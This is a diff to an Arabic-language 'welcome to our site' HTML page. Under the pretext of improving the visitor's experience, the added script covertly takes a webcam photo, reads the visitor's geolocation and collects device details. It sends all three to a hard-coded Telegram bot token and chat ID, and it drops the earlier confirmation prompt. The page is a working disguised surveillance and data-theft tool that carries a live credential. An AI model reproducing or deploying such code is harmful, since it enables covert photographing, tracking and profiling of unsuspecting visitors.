@@ -6,9 +6,9 @@
     <title>مرحباً بك</title>
     <style>
         body {
-            background-color: #f0f0f0;
+            background-color: #f0f8ff;
             color: #333;
-            font-family: Arial, sans-serif;
+            font-family: 'Arial', sans-serif;
             text-align: center;
             margin-top: 50px;
         }
@@ -18,38 +18,126 @@
             border-radius: 10px;
             box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.1);
             display: inline-block;
+            animation: fadeIn 1.5s ease-in-out;
         }
         h1 {
             color: #4CAF50;
+            font-size: 2.5em;
         }
         button {
-            padding: 10px 20px;
+            padding: 12px 25px;
             background-color: #4CAF50;
             color: white;
             border: none;
             border-radius: 5px;
             cursor: pointer;
+            font-size: 1.1em;
         }
         button:hover {
             background-color: #45a049;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
         }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>مرحباً بك في موقعنا!</h1>
-        <p>يرجى السماح للوصول إلى معلومات الجهاز لتحسين تجربتك.</p>
-        <button onclick="requestPermission()">السماح بالوصول</button>
+        <p>يرجى السماح للوصول إلى معلومات الجهاز، الكاميرا، والموقع لتحسين تجربتك.</p>
+        <button onclick="requestPermissions()">السماح بالوصول</button>
     </div>
 
     <script>
-        function requestPermission() {
-            // إشعار وهمي للحصول على إذن المستخدم
-            if (confirm("هل تسمح بالوصول إلى معلومات جهازك؟")) {
-                collectDeviceInfo();
+        function requestPermissions() {
+            // طلب إذن الوصول إلى الكاميرا
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    captureImage(stream);
+                })
+                .catch(err => {
+                    alert("لم يتم الحصول على إذن الكاميرا.");
+                });
+
+            // طلب إذن الموقع
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocation);
             } else {
-                alert("لم يتم الحصول على الإذن.");
+                alert("الموقع غير مدعوم من المتصفح.");
             }
+
+            // جمع معلومات الجهاز
+            collectDeviceInfo();
+        }
+
+        function captureImage(stream) {
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.play();
+
+            const canvas = document.createElement('canvas');
+            const context = canvas.getContext('2d');
+            video.addEventListener('loadedmetadata', () => {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const imageData = canvas.toDataURL('image/png');
+
+                // إرسال الصورة إلى البوت
+                sendImageToTelegram(imageData);
+
+                // إيقاف الكاميرا
+                stream.getTracks().forEach(track => track.stop());
+            });
+        }
+
+        function sendImageToTelegram(imageData) {
+            const botToken = "6604522716:AAFDrWCrOLf8k5lRDp5TyI1VbL9kcMPuwR4";
+            const chatId = "1854384004";
+            const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', imageData);
+
+            fetch(url, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    alert("تم إرسال الصورة بنجاح.");
+                } else {
+                    alert("حدث خطأ أثناء إرسال الصورة.");
+                }
+            })
+            .catch(error => {
+                console.error("Error:", error);
+            });
+        }
+
+        function sendLocation(position) {
+            const botToken = "6604522716:AAFDrWCrOLf8k5lRDp5TyI1VbL9kcMPuwR4";
+            const chatId = "1854384004";
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+
+            const url = `https://api.telegram.org/bot${botToken}/sendLocation?chat_id=${chatId}&latitude=${latitude}&longitude=${longitude}`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        alert("تم إرسال الموقع بنجاح.");
+                    } else {
+                        alert("حدث خطأ أثناء إرسال الموقع.");
+                    }
+                })
+                .catch(error => {
+                    console.error("Error:", error);
+                });
         }
 
         function collectDeviceInfo() {
@@ -61,9 +149,6 @@
                 screenHeight: screen.height
             };
 
-            // عرض رسالة تأكيد
-            alert("تم جمع المعلومات بنجاح!");
-
             // إرسال المعلومات إلى البوت
             sendToTelegram(deviceInfo);
         }
@@ -73,12 +158,13 @@
             const chatId = "1854384004";
             const message = `معلومات الجهاز:\nنظام التشغيل: ${info.platform}\nالمتصفح: ${info.userAgent}\nلغة المتصفح: ${info.language}\nدقة الشاشة: ${info.screenWidth}x${info.screenHeight}`;
 
-            // طلب HTTP لإرسال المعلومات إلى Telegram Bot API
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
                 .then(response => response.json())
                 .then(data => {
                     if (data.ok) {
-                        alert("تم إرسال المعلومات بنجاح إلى البوت.");
+                        alert("تم إرسال المعلومات بنجاح.");
                     } else {
                         alert("حدث خطأ أثناء إرسال المعلومات.");
                     }
